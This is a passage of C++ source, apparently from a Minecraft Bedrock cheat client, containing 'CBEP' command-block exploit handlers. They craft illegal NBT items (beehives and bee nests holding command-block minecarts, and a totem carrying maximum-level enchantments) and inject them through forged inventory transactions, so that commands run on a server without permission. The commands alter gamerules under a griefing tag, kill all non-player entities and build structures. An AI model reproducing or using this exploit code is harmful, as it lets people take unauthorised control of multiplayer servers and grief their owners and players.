false",definitions:["+minecraft:Player"],Ticking:1b,Invulnerable:1b,CustomName:"î„€Â§lÂ§kÂ§g:::Â§rÂ§lÂ§0Â§kÂ§f:::Â§rÂ§lÂ§0TIKÂ§fTOK Â§d@Â§cGETSHNAGEDÂ§kÂ§f:::Â§rÂ§lÂ§6Â§kÂ§g:::§kî„€",TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @r ~~~ gamerule sendcommandfeedback false",definitions:["+minecraft:Player"],Ticking:1b,Invulnerable:1b,CustomName:"î„€Â§lÂ§kÂ§g:::Â§rÂ§lÂ§0Â§kÂ§f:::Â§rÂ§lÂ§0TIKÂ§fTOK Â§d@Â§cGETSHNAGEDÂ§kÂ§f:::Â§rÂ§lÂ§6Â§kÂ§g:::§kî„€",TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @r ~~~ gamerule functioncommandlimit 1",definitions:["+minecraft:Player"],Ticking:1b,Invulnerable:1b,CustomName:"î„€Â§lÂ§kÂ§g:::Â§rÂ§lÂ§0Â§kÂ§f:::Â§rÂ§lÂ§0TIKÂ§fTOK Â§d@Â§cGETSHNAGEDÂ§kÂ§f:::Â§rÂ§lÂ§6Â§kÂ§g:::§kî„€",TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @r ~~~ gamerule maxcommandchainlength 1",definitions:["+minecraft:Player"],Ticking:1b,Invulnerable:1b,CustomName:"î„€Â§lÂ§kÂ§g:::Â§rÂ§lÂ§0Â§kÂ§f:::Â§rÂ§lÂ§0TIKÂ§fTOK Â§d@Â§cGETSHNAGEDÂ§kÂ§f:::Â§rÂ§lÂ§6Â§kÂ§g:::§kî„€",TicksLeftToStay:0}}],CanDestory:[grass],ShouldSpawnBees:0b,id:"Beehive"}}})";
		yot->fromTag(*Mojangson::parseTag(tag));
		g_Data.getLocalPlayer()->getTransactionManager()->addInventoryAction(C_InventoryAction(0, nullptr, nullptr, yot, nullptr, 1, 507, 99999));
		g_Data.getLocalPlayer()->getSupplies()->inventory->addItemToFirstEmptySlot(yot);
		if (partner->Partnered.selected == 0)
			clientMessageF("%sDADDY%s%s%s[%sSurge%s] %sHere is your CBEP!%s%sDADDY", OBFUSCATED, RESET, ITALIC, BOLD, BLUE, WHITE, BLUE, RESET, OBFUSCATED);
		else
			clientMessageF("[%sNG%s] %sHere is your CBEP!", LIGHT_PURPLE, WHITE, LIGHT_PURPLE);
		return true;
	}
	//Anticheat (helped by shnags)
	if (args->at(1) == "anticheat") {
		std::string tag = "{CanPlaceOn:[\"birch_pressure_plate\",\"jungle_pressure_plate\",\"dark_oak_pressure_plate\",\"spruce_pressure_plate\",\"dark_oak_button\",\"carved_pumpkin\",\"jungle_button\",\"stone_slab3\",\"granite_stairs\",\"andesite_stairs\",\"double_stone_slab3\",\"acacia_button\",\"birch_button\",\"spruce_button\",\"turtle_egg\",\"stone_slab4\",\"double_stone_slab4\",\"diorite_stairs\",\"polished_granite_stairs\",\"polished_diorite_stairs\",\"polished_andesite_stairs\",\"mossy_stone_brick_stairs\",\"smooth_red_sandstone_stairs\",\"smooth_sandstone_stairs\",\"blast_furnace\",\"barrel\",\"birch_standing_sign\",\"smooth_quartz_stairs\",\"smoker\",\"end_brick_stairs\",\"birch_wall_sign\",\"darkoak_standing_sign\",\"spruce_wall_sign\",\"darkoak_wall_sign\",\"spruce_standing_sign\",\"normal_stone_stairs\",\"jungle_wall_sign\",\"red_nether_brick_stairs\",\"jungle_standing_sign\",\"acacia_wall_sign\",\"mossy_cobblestone_stairs\",\"acacia_standing_sign\",\"loom\",\"campfire\",\"bee_nest\",\"wither_rose\",\"beehive\",\"dispenser\",\"sandstone\",\"bed\",\"web\",\"tallgrass\",\"wool\",\"iron_block\",\"deadbush\",\"brown_mushroom\",\"gold_block\",\"red_mushroom\",\"brick_block\",\"mossy_cobblestone\",\"mob_spawner\",\"torch\",\"tnt\",\"bookshelf\",\"redstone_wire\",\"diamond_ore\",\"lever\",\"ladder\",\"diamond_block\",\"crafting_table\",\"cactus\",\"snow_layer\",\"snow\",\"jukebox\",\"clay\",\"soul_sand\",\"glowstone\",\"cake\",\"fence\",\"netherrack\",\"trapdoor\",\"nether_wart\",\"blue_ice\",\"nether_brick\",\"melon_block\",\"monster_egg\",\"vine\",\"mycelium\",\"enchanting_table\",\"stonebrick\",\"beacon\",\"fence_gate\",\"waterlily\",\"nether_brick_fence\",\"brewing_stand\",\"cauldron\",\"tripWire\",\"flower_pot\",\"dragon_egg\",\"emerald_ore\",\"end_portal_frame\",\"tripwire_hook\",\"dropper\",\"end_stone\",\"emerald_block\",\"cobblestone_wall\",\"skull\",\"anvil\",\"seaLantern\",\"stained_hardened_clay\",\"quartz_block\",\"redstone_block\",\"slime\",\"hopper\",\"log2\",\"iron_trapdoor\",\"prismarine\",\"hay_block\",\"carpet\",\"hardened_clay\",\"coal_block\",\"red_sandstone\",\"spruce_fence_gate\",\"jungle_fence_gate\",\"birch_fence_gate\",\"grass_path\",\"dark_oak_fence_gate\",\"chorus_flower\",\"acacia_fence_gate\",\"end_bricks\",\"end_rod\",\"red_nether_brick\",\"purpur_block\",\"magma\",\"nether_wart_block\",\"chorus_plant\",\"concrete\",\"bone_block\",\"concretePowder\",\"stonecutter_block\",\"coral\",\"coral_fan_dead\",\"coral_block\",\"coral_fan\",\"wooden_pressure_plate\",\"stone_pressure_plate\",\"acacia_pressure_plate\",\"light_weighted_pressure_plate\",\"heavy_weighted_pressure_plate\",\"grass\",\"double_plant\",\"stone\",\"cobblestone\",\"planks\",\"dirt\",\"sapling\",\"bedrock\",\"sand\",\"gravel\",\"gold_ore\",\"log\",\"coal_ore\",\"sponge\",\"lapis_ore\",\"iron_ore\",\"lapis_block\",\"dark_oak_trapdoor\",\"sea_pickle\",\"bamboo\",\"lectern\",\"barrier\",\"dried_kelp_block\",\"scaffolding\",\"birch_trapdoor\",\"kelp\",\"seagrass\",\"acacia_trapdoor\",\"jungle_trapdoor\",\"spruce_trapdoor\",\"smooth_stone\",\"grindstone\",\"cartography_table\",\"smithing_table\",\"bell\",\"fletching_table\",\"composter\",\"lantern\",\"wood\",\"honeycomb_block\",\"honey_block\",\"leaves\",\"nether_brick_stairs\",\"brick_stairs\",\"activator_rail\",\"spruce_stairs\",\"ender_chest\",\"stone_brick_stairs\",\"sandstone_stairs\",\"wooden_slab\",\"powered_comparator\",\"quartz_stairs\",\"dark_oak_stairs\",\"standing_banner\",\"wooden_button\",\"daylight_detector\",\"birch_stairs\",\"unpowered_comparator\",\"jungle_stairs\",\"trapped_chest\",\"double_wooden_slab\",\"stained_glass_pane\",\"leaves2\",\"acacia_stairs\",\"packed_ice\",\"wall_banner\",\"red_sandstone_stairs\",\"stone_slab2\",\"double_stone_slab2\",\"spruce_door\",\"shulker_box\",\"white_glazed_terracotta\",\"blue_glazed_terracotta\",\"black_glazed_terracotta\",\"gray_glazed_terracotta\",\"purpur_stairs\",\"jungle_door\",\"purple_glazed_terracotta\",\"magenta_glazed_terracotta\",\"yellow_glazed_terracotta\",\"lime_glazed_terracotta\",\"light_blue_glazed_terracotta\",\"cyan_glazed_terracotta\",\"pink_glazed_terracotta\",\"dark_oak_door\",\"acacia_door\",\"brown_glazed_terracotta\",\"birch_door\",\"orange_glazed_terracotta\",\"silver_glazed_terracotta\",\"green_glazed_terracotta\",\"red_glazed_terracotta\",\"prismarine_stairs\",\"prismarine_bricks_stairs\",\"observer\",\"stained_glass\",\"dark_prismarine_stairs\",\"stone_slab\",\"double_stone_slab\",\"obsidian\",\"detector_rail\",\"golden_rail\",\"yellow_flower\",\"glass\",\"red_flower\",\"oak_stairs\",\"furnace\",\"chest\",\"standing_sign\",\"rail\",\"stone_stairs\",\"wooden_door\",\"ice\",\"iron_door\",\"powered_repeater\",\"brown_mushroom_block\",\"wall_sign\",\"unlit_redstone_torch\",\"redstone_torch\",\"redstone_ore\",\"stone_button\",\"pumpkin\",\"lit_pumpkin\",\"unpowered_repeater\",\"red_mushroom_block\",\"iron_bars\",\"glass_pane\"],Count:1b,Name:\"minecraft:movingBlock\",tag:{movingBlock:{name:\"minecraft:air\",states:{}}movingEntity:{Occupants:[{ActorIdentifier:\"minecraft:command_block_minecart<>\",SaveData:{Command:" "\" execute @e ~ ~ ~ kill @e[type=!player] " "\",Invulnerable:1b,Ticking:1b,TicksLeftToStay:-1,definitions:[" "\"+minecraft:player" "\"]}},{ActorIdentifier:\"minecraft:command_block_minecart<>\",SaveData:{Command:" "\" /title @a actionbar NRG'S ANTICHEAT ACTIVE " "\",Ticking:1b,TicksLeftToStay:-1,Invulnerable:1b,definitions:[" "\"+minecraft:player" "\"]}}],CanDestory:[grass],ShouldSpawnBees:0b,id:\"Beehive\"}}}";
		yot->fromTag(*Mojangson::parseTag(tag));
		g_Data.getLocalPlayer()->getTransactionManager()->addInventoryAction(C_InventoryAction(0, nullptr, nullptr, yot, nullptr, 1, 507, 99999));
		g_Data.getLocalPlayer()->getSupplies()->inventory->addItemToFirstEmptySlot(yot);
		if (partner->Partnered.selected == 0)
			clientMessageF("%sDADDY%s%s%s[%sSurge%s] %sHere is your CBEP!%s%sDADDY", OBFUSCATED, RESET, ITALIC, BOLD, BLUE, WHITE, BLUE, RESET, OBFUSCATED);
		else
			clientMessageF("[%sNG%s] %sHere is your CBEP!", LIGHT_PURPLE, WHITE, LIGHT_PURPLE);
		return true;
	}

	if (args->at(1) == "test") {
		std::string tag = R"({Count:1b,Damage:0s,Name:"minecraft:totem_of_undying",WasPickedUp:0b,tag:{ench:[{id:0s,lvl:32767s},{id:2s,lvl:32767s},{id:5s,lvl:32767s},{id:6s,lvl:32767s},{id:7s,lvl:32767s},{id:8s,lvl:32767s},{id:36s,lvl:32767s},{id:9s,lvl:32767s},{id:13s,lvl:32767s},{id:14s,lvl:32767s},{id:16s,lvl:32767s},{id:17s,lvl:32767s},{id:21s,lvl:32767s},{id:23s,lvl:32767s},{id:29s,lvl:32767s},{id:12s,lvl:32767s},{id:15s,lvl:32767s},{id:19s,lvl:32767s},{id:20s,lvl:32767s},{id:22s,lvl:32767s},{id:24s,lvl:32767s},{id:27s,lvl:32767s},{id:28s,lvl:32767s},{id:30s,lvl:32767s},{id:33s,lvl:32767s},{id:35s,lvl:32767s}]}})";
		yot->fromTag(*Mojangson::parseTag(tag));
		g_Data.getLocalPlayer()->getTransactionManager()->addInventoryAction(C_InventoryAction(0, nullptr, nullptr, yot, nullptr, 1, 507, 99999));
		g_Data.getLocalPlayer()->getSupplies()->inventory->addItemToFirstEmptySlot(yot);
		if (partner->Partnered.selected == 0)
			clientMessageF("%sDADDY%s%s%s[%sSurge%s] %sHere is your CBEP!%s%sDADDY", OBFUSCATED, RESET, ITALIC, BOLD, BLUE, WHITE, BLUE, RESET, OBFUSCATED);
		else
			clientMessageF("[%sNG%s] %sHere is your CBEP!", LIGHT_PURPLE, WHITE, LIGHT_PURPLE);
		return true;
	}

//ENTIRE HOUSE NBT
	{
		if (args->at(1) == "house") {
			std::string tag1 = R"({Count:1b,Damage:0s,Name:"bee_nest",tag:{Occupants:[{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Actions:"[
{
"button_name":"Build House",
"data":[
{
"cmd_line":"fill\t~-8\t~\t~9\t~-22\t~4\t~-8\tconcrete\t0",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-9\t~\t~8\t~-21\t~3\t~-7\tair\t0",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-8\t~-1\t~8\t~-22\t~-1\t~-8\tplanks\t4",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-8\t~\t~-7\t~-8\t~3\t~-6\tstained_glass_pane\t15",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-8\t~\t~-3\t~-8\t~3\t~-2\tstained_glass_pane\t15",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-8\t~\t~3\t~-8\t~3\t~4\tstained_glass_pane\t15",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-8\t~\t~7\t~-8\t~3\t~8\tstained_glass_pane\t15",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-11\t~1\t~9\t~-20\t~3\t~9\tstained_glass_pane\t15",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-11\t~1\t~-8\t~-20\t~3\t~-8\tstained_glass_pane\t15",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-22\t~1\t~4\t~-22\t~3\t~7\tstained_glass_pane\t15",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-22\t~1\t~-3\t~-22\t~3\t~-6\tstained_glass_pane\t15",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-10\t~5\t~9\t~-21\t~5\t~9\tquartz_stairs\t7",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-10\t~5\t~-8\t~-21\t~5\t~-8\tquartz_stairs\t6",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-7\t~4\t~-8\t~-4\t~\t~9\twood\t4\tkeep",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-6\t~\t~-8\t~-5\t~3\t~9\tair\t0\treplace\twood",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-7\t~\t~-7\t~-7\t~3\t~8\tair\t0\treplace\twood",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-4\t~\t~8\t~-4\t~3\t~3\tair\t0\treplace\twood",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-4\t~\t~-7\t~-4\t~3\t~-2\tair\t0\treplace\twood",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-4\t~\t~\t~-4\t~3\t~1\tair\t0\treplace\twood",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-5\t~\t~-1\t~-7\t~3\t~2\tconcrete\t0\tkeep",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-6\t~1\t~-1\t~-7\t~2\t~2\tstained_glass_pane\t15",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-5\t~\t~\t~-7\t~3\t~1\tair\t0",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-8\t~\t~\t~-8\t~1\t~1\tair\t0",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-8\t~2\t~\t~-8\t~2\t~1\tquartz_stairs\t5",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-3\t~\t~3\t~-3\t~4\t~3\tconcrete\t0",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-3\t~\t~-2\t~-3\t~4\t~-2\tconcrete\t0",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-7\t~3\t~10\t~-3\t~3\t~-9\tstone_slab\t14\treplace\tair",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-21\t~5\t~-7\t~-8\t~5\t~8\tplanks\t4\tkeep",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-22\t~10\t~-8\t~-7\t~6\t~9\tconcrete\t0",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-21\t~9\t~-7\t~-8\t~6\t~8\tair\t0\treplace\tconcrete",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-7\t~9\t~3\t~-7\t~7\t~8\tstained_glass_pane\t15",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-7\t~9\t~-7\t~-7\t~7\t~-2\tstained_glass_pane\t15",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-11\t~9\t~9\t~-20\t~7\t~9\tstained_glass_pane\t15",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-22\t~6\t~-7\t~-22\t~9\t~-6\tstone_slab\t6",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-22\t~6\t~8\t~-22\t~9\t~7\tstone_slab\t6",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-9\t~\t~-8\t~-7\t~10\t~-8\twood\t4",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-9\t~\t~9\t~-7\t~10\t~9\twood\t4",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-7\t~10\t~2\t~-7\t~6\t~9\twood\t4\treplace\tconcrete",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-7\t~10\t~-1\t~-7\t~6\t~-7\twood\t4\treplace\tconcrete",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-7\t~5\t~9\t~-4\t~5\t~-8\tquartz_block\t0\treplace\tstone_slab",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-6\t~6\t~8\t~-5\t~6\t~-7\tstone_slab\t6",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-8\t~\t~10\t~-8\t~10\t~10\tconcrete\t0",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-8\t~\t~-9\t~-8\t~10\t~-9\tconcrete\t0",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-10\t~10\t~-8\t~-22\t~10\t~-8\twood\t4",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-10\t~10\t~9\t~-22\t~10\t~9\twood\t4",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-22\t~10\t~-8\t~-22\t~10\t~9\twood\t4",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-22\t~\t~9\t~-22\t~10\t~9\twood\t4",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-22\t~\t~-8\t~-22\t~10\t~-8\twood\t4",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-22\t~\t~-1\t~-22\t~10\t~-1\twood\t4",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-22\t~\t~2\t~-22\t~10\t~2\twood\t4",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-24\t~5\t~5\t~-22\t~5\t~-4\tplanks\t4\treplace\tair",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-25\t~\t~-1\t~-25\t~4\t~-1\twood\t4",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-25\t~\t~2\t~-25\t~4\t~2\twood\t4",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-25\t~5\t~6\t~-25\t~5\t~-5\tquartz_stairs\t4",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-23\t~5\t~6\t~-24\t~5\t~6\tquartz_stairs\t7",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-23\t~5\t~-5\t~-24\t~5\t~-5\tquartz_stairs\t6",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-25\t~4\t~6\t~-23\t~4\t~-5\tstone_slab\t14\treplace\tair",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-22\t~5\t~8\t~-22\t~5\t~-7\twood\t4\treplace\tair",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-22\t~9\t~5\t~-22\t~6\t~-4\tair\t0\treplace\tconcrete",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-25\t~6\t~6\t~-23\t~6\t~-5\tstained_glass_pane\t15",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-24\t~6\t~5\t~-23\t~6\t~-4\tair\t0\treplace\tstained_glass_pane",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-6\t~10\t~-9\t~-15\t~10\t~10\tstone_slab\t14\treplace\tair",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-15\t~10\t~-16\t~-23\t~10\t~17\tstone_slab\t14\treplace\tair",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-15\t~16\t~17\t~-23\t~11\t~-16\tconcrete\t0\tkeep",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-16\t~15\t~16\t~-22\t~12\t~-15\tair\t0\treplace\tconcrete",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-16\t~11\t~16\t~-22\t~11\t~-15\tplanks\t4\treplac\tconcrete",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-15\t~12\t~8\t~-15\t~15\t~17\tstained_glass_pane\t15\treplace\tconcrete",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-16\t~15\t~17\t~-23\t~12\t~-16\tstained_glass_pane\t15\treplace\tconcrete",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-15\t~15\t~-2\t~-15\t~12\t~3\tstained_glass_pane\t15\treplace\tconcrete",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-15\t~15\t~-7\t~-15\t~12\t~-16\tstained_glass_pane\t15\treplace\tconcrete",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-7\t~11\t~-8\t~-14\t~11\t~9\tplanks\t4",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-6\t~11\t~-9\t~-6\t~11\t~10\tquartz_stairs\t5",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-6\t~12\t~-9\t~-6\t~12\t~10\tstained_glass_pane\t15",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-15\t~11\t~-2\t~-15\t~11\t~7\tplanks\t4\treplace\tconcrete",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-15\t~15\t~-5\t~-15\t~12\t~-4\tair\t0\treplace\tconcrete",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-15\t~15\t~5\t~-15\t~12\t~6\tair\t0\treplace\tconcrete",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-7\t~11\t~10\t~-14\t~11\t~10\tquartz_stairs\t7",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-7\t~11\t~-9\t~-14\t~11\t~-9\tquartz_stairs\t6",
"cmd_ver":12
},
{
"cmd_line":"/fill\t~-15\t~11\t~10\t~-15\t~11\t~17\tquartz_stairs\t5",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-16\t~11\t~17\t~-23\t~11\t~17\tquartz_stairs\t7",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-15\t~11\t~-9\t~-15\t~11\t~-16\tquartz_stairs\t5",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-16\t~11\t~-16\t~-23\t~11\t~-16\tquartz_stairs\t6",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-23\t~11\t~16\t~-23\t~11\t~-15\tquartz_stairs\t4",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-7\t~12\t~10\t~-14\t~12\t~10\tstained_glass_pane\t15",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-7\t~12\t~-9\t~-14\t~12\t~-9\tstained_glass_pane\t15",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-9\t~11\t~-6\t~-14\t~11\t~-3\tconcrete\t0",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-10\t~11\t~-5\t~-14\t~10\t~-4\tair\t0",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-13\t~5\t~-1\t~-20\t~5\t~2\tconcrete\t0",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-14\t~4\t~\t~-19\t~5\t~1\tair\t0",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-13\t~6\t~-1\t~-20\t~6\t~2\tstained_glass_pane\t15",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-14\t~6\t~\t~-20\t~6\t~1\tair\t0",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-9\t~12\t~-6\t~-14\t~12\t~-3\tstained_glass_pane\t15",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-10\t~12\t~-5\t~-14\t~12\t~-4\tair\t0",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-15\t~\t~\t~-15\t~\t~1\tquartz_stairs\t1",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-16\t~1\t~\t~-16\t~1\t~1\tquartz_stairs\t1",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-17\t~2\t~\t~-17\t~2\t~1\tquartz_stairs\t1",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-18\t~3\t~\t~-18\t~3\t~1\tquartz_stairs\t1",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-19\t~4\t~\t~-19\t~4\t~1\tquartz_stairs\t1",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-20\t~5\t~\t~-20\t~5\t~1\tquartz_stairs\t1",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-16\t~\t~\t~-16\t~\t~1\tquartz_stairs\t4",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-17\t~1\t~\t~-17\t~1\t~1\tquartz_stairs\t4",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-18\t~2\t~\t~-18\t~2\t~1\tquartz_stairs\t4",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-19\t~3\t~\t~-19\t~3\t~1\tquartz_stairs\t4",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-10\t~6\t~-4\t~-10\t~6\t~-5\tquartz_stairs\t1",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-11\t~7\t~-4\t~-11\t~7\t~-5\tquartz_stairs\t1",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-12\t~8\t~-4\t~-12\t~8\t~-5\tquartz_stairs\t1",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-13\t~9\t~-4\t~-13\t~9\t~-5\tquartz_stairs\t1",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-14\t~10\t~-4\t~-14\t~10\t~-5\tquartz_stairs\t1",
"cmd_ver":12
},)";
			std::string tag2 = R"({
"cmd_line":"fill\t~-15\t~11\t~-4\t~-15\t~11\t~-5\tquartz_stairs\t1",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-11\t~6\t~-4\t~-11\t~6\t~-5\tquartz_stairs\t4",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-12\t~7\t~-4\t~-12\t~7\t~-5\tquartz_stairs\t4",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-13\t~8\t~-4\t~-13\t~8\t~-5\tquartz_stairs\t4",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-14\t~9\t~-4\t~-14\t~9\t~-5\tquartz_stairs\t4",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-11\t~4\t~6\t~-19\t~4\t~4\tsealantern",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-11\t~4\t~-5\t~-19\t~4\t~-3\tsealantern",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-15\t~-1\t~\t~-15\t~-1\t~1\tsealantern",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-10\t~10\t~5\t~-19\t~10\t~6\tsealantern",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-10\t~10\t~\t~-19\t~10\t~1\tsealantern",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-17\t~10\t~-4\t~-19\t~10\t~-5\tsealantern",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-10\t~5\t~-4\t~-10\t~5\t~-5\tsealantern",
"cmd_ver":12
},
{
"cmd_line":"fill\t~\t~-1\t~\t~\t~-1\t~\tstone\t0",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-7\t~\t~3\t~-7\t~\t~8\tdouble_plant\t4",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-7\t~\t~-2\t~-7\t~\t~-7\tdouble_plant\t4",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-21\t~3\t~-1\t~-16\t~\t~-1\tconcrete\t0",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-16\t~\t~-2\t~-16\t~\t~-3\tquartz_stairs\t4",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-21\t~\t~-2\t~-21\t~\t~-3\tquartz_stairs\t5",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-20\t~\t~-2\t~-17\t~\t~-3\tstone_slab\t14",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-20\t~1\t~-2\t~-17\t~2\t~-2\tconcrete\t15",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-21\t~1\t~-2\t~-16\t~1\t~-2\tgrindstone\t0\treplace\tair",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-21\t~1\t~-3\t~-21\t~1\t~-3\tflower_pot",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-16\t~1\t~-3\t~-16\t~1\t~-3\tflower_pot",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-20\t~1\t~-3\t~-20\t~1\t~-3\tstone_button\t1",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-17\t~\t~-7\t~-17\t~\t~-6\tdark_oak_stairs\t0",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-20\t~\t~-7\t~-18\t~\t~-7\tdark_oak_stairs\t3",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-21\t~\t~-7\t~-21\t~\t~-6\tdark_oak_stairs\t1",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-20\t~\t~-6\t~-18\t~\t~-6\twooden_slab\t5",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-21\t~3\t~2\t~-9\t~\t~2\tconcrete\t0",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-12\t~2\t~2\t~-9\t~\t~2\tair\t0\treplace\tconcrete",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-20\t~\t~2\t~-19\t~\t~2\tcampfire\t0",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-20\t~\t~3\t~-19\t~\t~3\tstained_glass_pane\t15",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-21\t~\t~3\t~-18\t~\t~3\tquartz_block\t0\treplace\tair",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-20\t~1\t~3\t~-19\t~1\t~3\tcarpet\t0",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-21\t~1\t~3\t~-18\t~1\t~3\tflower_pot\t0\treplace\tair",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-21\t~\t~8\t~-21\t~\t~8\tbed\t1",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-21\t~\t~7\t~-21\t~\t~7\tbed\t1",
